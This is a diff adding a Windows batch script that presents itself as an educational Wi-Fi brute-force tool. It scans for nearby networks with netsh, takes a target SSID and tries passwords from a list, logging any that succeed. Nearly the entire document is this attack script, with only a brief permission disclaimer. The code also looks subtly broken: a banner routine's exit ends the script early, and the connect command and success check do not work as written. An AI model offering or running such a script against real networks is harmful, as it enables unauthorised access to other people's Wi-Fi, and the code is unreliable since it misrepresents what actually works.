@@ -1,0 +1,92 @@
+@echo off
+:: Wi-Fi Brute-Force Tool - Educational Purposes Only
+:: Author: [Your Name or Alias]
+:: Updated: [Date]
+:: DISCLAIMER: Use only on your own networks or with explicit permission. Unauthorized use is illegal.
+
+:: Variables
+setlocal enabledelayedexpansion
+set passlist=passlist.txt
+set attempts_log=attempt.xml
+set target_ssid=
+set target_interface=
+
+:: Check for required files
+if not exist "%passlist%" (
+    echo [ERROR] Password list not found: %passlist%
+    exit /b
+)
+
+:: Function to display banner
+:banner
+echo ======================================
+echo       Wi-Fi Brute-Force Tool
+echo ======================================
+exit /b
+
+:: Start Script
+call :banner
+
+:: List Wi-Fi Interfaces
+echo [INFO] Scanning for Wi-Fi interfaces...
+for /f "tokens=2 delims=:" %%i in ('netsh wlan show interfaces ^| findstr "Name"') do (
+    set target_interface=%%i
+)
+
+if "%target_interface%"=="" (
+    echo [ERROR] No Wi-Fi interface detected.
+    exit /b
+)
+
+:: Clean up interface name
+set target_interface=%target_interface:~1%
+echo [INFO] Found Wi-Fi Interface: %target_interface%
+
+:: Scan for Available Wi-Fi Networks
+echo [INFO] Scanning for Wi-Fi networks...
+for /f "tokens=1,2* delims=:" %%i in ('netsh wlan show networks ^| findstr "SSID"') do (
+    echo SSID Detected: %%k
+    set target_ssid=%%k
+)
+
+if "%target_ssid%"=="" (
+    echo [ERROR] No Wi-Fi networks found.
+    exit /b
+)
+
+:: Prompt User for Target SSID
+echo.
+echo [INPUT] Enter the target SSID (case-sensitive):
+set /p target_ssid=
+
+if "%target_ssid%"=="" (
+    echo [ERROR] SSID cannot be empty.
+    exit /b
+)
+
+:: Brute-Force Passwords
+if exist %attempts_log% del %attempts_log%
+echo [INFO] Starting brute-force on SSID: %target_ssid%
+
+for /f "tokens=*" %%p in (%passlist%) do (
+    echo Attempting password: %%p
+    echo.
+    netsh wlan connect name="%target_ssid%" key=%%p >nul 2>&1
+    if not errorlevel 1 (
+        echo [SUCCESS] Password found: %%p
+        echo %%p > %attempts_log%
+        goto :end
+    )
+)
+
+:end
+if not exist %attempts_log% (
+    echo [FAILED] No valid password found in the list.
+) else (
+    echo [SUCCESS] Password saved to %attempts_log%
+)
+
+echo.
+echo [INFO] Process complete.
+pause
+exit /b
